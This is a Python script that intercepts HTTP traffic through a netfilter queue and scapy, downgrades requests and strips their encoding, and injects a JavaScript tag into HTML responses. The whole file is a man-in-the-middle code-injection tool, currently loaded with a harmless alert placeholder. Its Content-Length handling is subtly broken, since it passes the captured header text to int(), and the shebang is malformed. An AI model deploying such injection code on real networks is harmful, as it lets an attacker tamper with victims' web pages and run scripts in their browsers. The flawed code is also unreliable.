#!usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

def setLoad(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.Raw):
        try:
            load = scapyPacket[scapy.Raw].load.decode()
            if scapyPacket[scapy.TCP].dport == 80 or scapyPacket[scapy.TCP].dport == 8080:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapyPacket[scapy.TCP].sport == 80 or scapyPacket[scapy.TCP].sport == 8080:
                print("[+] Response")
                injectionCode = "<script>alert('test');</script>"
                load = load.replace("</body>", injectionCode + "</body>")
                contentLengthSearch = re.search("(?:Content-Length:\s)(\d*)", load)
                if contentLengthSearch and "text/html" in load:
                    contentLength = contentLengthSearch.group(0)
                    newContentLength = int(contentLength) + len(injectionCode)
                    load = load.replace(contentLength, str(newContentLength))
                
            if load != scapyPacket[scapy.Raw].load:
                newPacket = setLoad(scapyPacket, load)
                packet.set_payload(bytes(newPacket))
        except UnicodeDecodeError:
            pass
                
    packet.accept()
    
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket) # 0 is [queueNum]
queue.run()
